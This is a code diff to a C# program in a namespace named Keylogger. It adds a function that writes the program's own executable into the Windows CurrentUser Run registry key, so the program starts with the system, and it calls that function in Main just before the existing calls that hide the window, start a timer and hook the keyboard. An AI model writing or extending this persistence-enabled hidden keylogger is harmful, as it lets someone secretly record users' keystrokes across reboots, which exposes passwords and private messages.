@@ -1,3 +1,4 @@
+using Microsoft.Win32;
 using System.Diagnostics;
 using System.Drawing.Imaging;
 using System.Net.Mail;
@@ -250,9 +251,29 @@ namespace Keylogger
 
         #endregion
 
+        #region registry that open with windows
+        static void StartWithOS()
+        {
+            RegistryKey regKey = Registry.CurrentUser.CreateSubKey("Software\\ListenToUser");
+            RegistryKey regStart = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
+            string keyValue = "1";
+
+            try
+            {
+                regKey.SetValue("Index", keyValue);
+                regStart.SetValue("LapLich", Application.StartupPath + "\\" + Application.ProductName + ".exe");
+                regKey.Close();
+            }
+            catch (Exception ex)
+            {
+            }
+        }
+        #endregion
+
         [STAThread]
         static void Main(string[] args)
         {
+            StartWithOS();
             HideWindow();
             StartTimer();
             HookKeyBoard();
